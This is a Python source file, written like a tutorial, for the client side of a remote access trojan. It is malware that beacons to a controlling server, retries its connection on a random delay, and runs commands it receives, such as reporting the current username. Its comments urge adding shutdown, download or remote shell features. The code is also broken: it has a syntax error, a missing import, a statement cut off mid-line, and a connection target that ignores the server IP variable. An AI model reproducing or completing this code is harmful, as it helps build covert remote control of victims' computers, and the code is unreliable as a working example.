#!/usr/bin/python

#Imports
import socket
import time
import random 

#Variables
lHost = "" # This is the Server's IP
# lHost is the Variable, where you have to put in your own IP. If you test the whole RAT on the same Computer (Server and Client running there) then you have to just leave the field blank.

port = 80  # This is the Connection Port
# -Port is again the Variable where you can change the connection port (Both Ports have to be the same in Server Code and Client Code)

#Functions

def send(msg):
    s.send(msg.encode("UTF-8"))
    # This sends an our message which is encoded in UTF-8 encryption
    
#getInstructions() is the Heart of our Client. This Function receives the messages from the Server and then check them for keywords like 'test'. 
# Test is the first added "feature" of this RAT. 
# It sends only a response to the Server saying that it's working. 
# Here is the place to add features for yourself, like a shutdown, dowload or even a shell. 
# Be creative and try different ideas.

def getInstructions():
    while True:
        msg = s.recv(4096)
        # Receive up to 4096 bytes from a peer 
        # In this case, it is recieving data from our server at 4096 bytes, and then setting it as the variable "msg"
        inst = msg.decode("UTF-8")
        #As we encoded our message earlier from our servier, our message from the server is being decoded and set as the variable "inst"

        #Instructions
        # If the command is "test"...
        if inst == "test":
            try:
                # send to the server...
                send("[OK] Test works!")
            except:
                pass
        if inst == "getuser"
            try: 
                s.send(getpass.getuser().encode())
            except:
                pass
        else:
            try:
                s.send

#Connection

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# AF_INET refers to the address family ipv4. 
# The SOCK_STREAM means connection oriented TCP protocol.
# This is now our labeled socket

host = socket.gethostname()
# Return a string containing the hostname of the machine where the Python interpreter is currently executing
# In this case, the variable "host" contains this

connected = False
# If our connectiong doesn't work then...
while connected == False:
    # Until the connection becomes true...
    try: 
      #try this:
        s.connect((host, port))
        # This method actively initiates TCP server connection.
        # In this case, it connects to the TCP server of the host and the port.
        connected = True
        # the connection is now true
    except: 
      # If it doesn't connect
        sleepTime = random.randint(20, 30)
        time.sleep(sleepTime)
        # Wait from a time of around 20-30 seconds and then connect again
 
getInstructions()